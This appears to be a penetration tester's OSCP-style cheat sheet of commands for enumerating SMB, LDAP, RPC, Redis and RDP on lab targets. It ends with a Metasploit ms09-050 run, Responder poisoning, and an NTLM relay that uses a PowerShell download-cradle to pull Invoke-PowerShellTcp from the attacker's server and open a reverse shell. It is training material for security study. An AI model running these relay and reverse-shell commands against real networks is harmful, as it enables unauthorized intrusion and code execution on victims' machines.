SMB, port 139/445
```
lookupsid.py oscp.exam/anonymous@10.129.235.244 -no-pass
```
- used anonymous because when enumerating smb anonymously can see shares with `smbclient -L <ip> -N`
- to remove everything before the `\` use vim command:
	- `:%s/^.*\\//`
- to remove everything after the first space
	- `:%s/ .*$//`
if READ access to IPC$ share, can rid-brute users
```
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```

```
enum4linux -a -u "" -p "" <dc-ip> && enum4linux -a -u "guest" -p "" <dc-ip>
```

```
smbmap -u "" -p "" -P 445 -H <dc-ip> && smbmap -u "guest" -p "" -P 445 -H <dc-ip>
```

```
smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip>
```

```
nxc smb <ip> -u '' -p ''
```

```
nxc smb <ip> -u 'a' -p '' 
```

```
nxc smb <ip> --users
```

LDAP, port 389/636

```
ldapsearch -x -b "dc=hutch,dc=offsec" "user"  -H ldap://192.168.199.122 | grep dn
```
- check for users
- vim command to remove everything but names from output `:%s/^.*CN=\([^,]*\),.*$/\1/`
	- or try `:g/^dn: CN=\([^,]\+\),CN=Users,DC=hutch,DC=offsec$/s//\1/`


- vim command to reformat names with like `first.last` `:%s/^\(.*\) \([^ ]*\)$/\1.\2/`

```
ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.199.122 | grep description
```
- searches for descriptions
```
ldapsearch -x -b "dc=baby,dc=vl" "*"  -H ldap://10.10.88.213 | grep desc -A2
```
- searches for descriptions with more context)


```
nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
```

```
ldapsearch -d 1 -x -H ldap://10.10.5.122 -b "dc=VULNNET"
```

RPC, port 135
```
rpcclient -N -U '' 10.10.10.161
```
- `enumdomusers`
```
net rpc group members 'Domain Users' -W '<domain>' -I '<ip>' -U '%'
```

Redis NoSQL, Port 6379
```
redis-cli -h 10.10.246.197
```
- to retrieve all parameters from redis-cli, run ``CONFIG GET *``

if smb message signing is disabled, either eternal blue or more likely ms09-050
```
nmap -p139,445 --script "smb-vuln*" 192.168.188.40
```
- test if vulnerable
	- if so:
```
msfconsole
search ms09-050
use 0
set LHOST <my ip>
set RHOSTS <victim ip>
run
```
- root shell

RDP
```
xfreerdp /v:192.168.161.221 -sec-nla
```


Analyze behavior over network without responding
```
sudo responder -I tun0 -A
```
- can use this in combination with other exploits to see if anything is replayable
- make sure to enable SMB with `cat /usr/share/responder/Responder.conf | grep -i smb`
	- if Off, use `sudo sed -i "s/SMB = Off/SMB = On/" /usr/share/responder/Responder.conf` to turn it On

***NTLM Relay over SMB***
```
sudo sed -i "s/SMB = On/SMB = Off/" /usr/share/responder/Responder.conf
```
- turn off smb in responder (so doesnt conflict with ntlmrelayx)
- switch back to On to re-enable afterwards  `sudo sed -i "s/SMB = Off/SMB = On/" /usr/share/responder/Responder.conf`
```
nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
```
- create list of IPs from subnet with smb signing disabled, so can be used to relay, saved as file relayTargets.txt in current directory
```
sudo responder -I tun0 
```
- start responder
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```
- output might show Administrator local SAM hash, if session relayed has privileged access on the target machine. if nothing useful in output, try command execution:
```
cp /home/daniel/Downloads/nishang-master/Shells/Invoke-PowerShellTcp.ps1 .
```
- copy Invoke-PowerShellTcp.ps1 to current directory
```
python3 -m http.server 8000
```
- serve Invoke-PowerShellTcp.ps1 on a http server
```
rlwrap -cAr nc -lnvp 7331
```
- catch the rev shell
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
```
- assumes my IP is 172.16.117.30